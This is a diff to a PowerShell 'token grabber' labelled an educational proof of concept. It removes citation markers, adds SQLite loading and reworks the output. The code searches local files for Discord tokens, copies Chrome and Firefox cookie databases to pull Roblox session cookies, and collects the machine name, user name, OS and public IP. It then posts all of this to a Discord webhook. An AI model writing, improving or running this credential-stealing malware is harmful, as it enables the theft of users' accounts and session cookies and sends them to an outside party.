@@ -1,3 +1,4 @@
+
 <#
  EDUCATIONAL PROOF OF CONCEPT - TEST IN VM ONLY
  Extracts Discord tokens and Roblox cookies, sends to Discord webhook
@@ -29,7 +30,7 @@ function Get-DiscordTokens {
                 foreach ($file in $files) {
                     $content = Get-Content -Path $file.FullName -Raw -ErrorAction SilentlyContinue
                     if ($content) {
-                        # Match both MFA and standard tokens [citation:4]
+                        # Match both MFA and standard tokens
                         $mfaMatches = [regex]::Matches($content, 'mfa\.[A-Za-z0-9_-]{84}')
                         $standardMatches = [regex]::Matches($content, '[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}')
                         
@@ -52,7 +53,7 @@ function Get-RobloxCookies {
     
     $cookies = @()
     
-    # Chrome-based browsers (Edge, Chrome, Brave, Opera) [citation:5]
+    # Chrome-based browsers (Edge, Chrome, Brave, Opera)
     $browserPaths = @(
         "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
         "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Cookies",
@@ -61,7 +62,7 @@ function Get-RobloxCookies {
         "$env:APPDATA\Opera Software\Opera Stable\Network\Cookies"
     )
     
-    # Firefox paths [citation:5]
+    # Firefox paths
     $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release" -ErrorAction SilentlyContinue
     foreach ($profile in $firefoxProfiles) {
         $browserPaths += "$($profile.FullName)\cookies.sqlite"
@@ -78,7 +79,13 @@ function Get-RobloxCookies {
                 Copy-Item -Path $path -Destination $tempDb -Force -ErrorAction SilentlyContinue
                 
                 if (Test-Path $tempDb) {
-                    # Use PowerShell to query SQLite (requires System.Data.SQLite)
+                    # Load SQLite assembly
+                    if (-not [System.Reflection.Assembly]::LoadWithPartialName('System.Data.SQLite')) {
+                        Write-Host "  [!] SQLite assembly not found - skipping" -ForegroundColor Yellow
+                        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+                        continue
+                    }
+                    
                     $conn = New-Object System.Data.SQLite.SQLiteConnection
                     $conn.ConnectionString = "Data Source=$tempDb"
                     
@@ -98,9 +105,9 @@ function Get-RobloxCookies {
                         
                         while ($reader.Read()) {
                             if ($path -like "*Chrome*" -or $path -like "*Edge*" -or $path -like "*Brave*") {
-                                # Chrome cookies are encrypted with DPAPI [citation:2]
-                                Write-Host "  [!] Chrome cookies require DPAPI decryption (skipped in this PoC)" -ForegroundColor Yellow
-                                $cookies += "[Encrypted Roblox cookie found - requires DPAPI decryption]"
+                                # Chrome cookies are encrypted with DPAPI
+                                Write-Host "  [!] Encrypted Roblox cookie found - requires DPAPI" -ForegroundColor Yellow
+                                $cookies += "[Encrypted Roblox cookie found]"
                             } else {
                                 # Firefox cookies are plaintext
                                 $cookieValue = $reader["value"]
@@ -173,43 +180,45 @@ function Send-ToDiscord {
         $robloxText = "No Roblox cookies found"
     }
     
-    # Get system info [citation:7]
+    # Get system info
     $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
     $os = (Get-WmiObject Win32_OperatingSystem).Caption
     
-    # Build Discord embed
-    $embed = @{
-        title = "🎣 Grabber Results"
-        color = 0x5865F2  # Discord blurple
-        fields = @(
-            @{
-                name = "💻 System"
-                value = "PC: $computerName`nUser: $userName`nOS: $os`nIP: $ip"
-                inline = $true
-            },
-            @{
-                name = "🔑 Discord Tokens"
-                value = "```$tokenText```"
-                inline = $false
-            },
-            @{
-                name = "🍪 Roblox Cookies"
-                value = "```$robloxText```"
-                inline = $false
-            }
-        )
-        timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssK")
-        footer = @{
-            text = "Educational PoC - VM Only"
+    # Build Discord embed (no emojis)
+    $fields = @(
+        @{
+            name = "System"
+            value = "PC: $computerName`nUser: $userName`nOS: $os`nIP: $ip"
+            inline = $true
+        },
+        @{
+            name = "Discord Tokens"
+            value = "```$tokenText```"
+            inline = $false
+        },
+        @{
+            name = "Roblox Cookies"
+            value = "```$robloxText```"
+            inline = $false
         }
-    }
+    )
     
     # Add token info if available
     if ($tokenInfo.valid) {
-        $embed.fields += @{
-            name = "✅ Valid Token"
+        $fields += @{
+            name = "Valid Token"
             value = "User: $($tokenInfo.username)`nID: $($tokenInfo.id)`nEmail: $($tokenInfo.email)"
             inline = $false
+        }
+    }
+    
+    $embed = @{
+        title = "Grabber Results"
+        color = 0x5865F2
+        fields = $fields
+        timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssK")
+        footer = @{
+            text = "Educational PoC - VM Only"
         }
     }
     
@@ -217,7 +226,7 @@ function Send-ToDiscord {
         embeds = @($embed)
     } | ConvertTo-Json -Depth 10
     
-    # Send to webhook [citation:6]
+    # Send to webhook
     try {
         Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
         Write-Host "[+] Results sent to Discord" -ForegroundColor Green
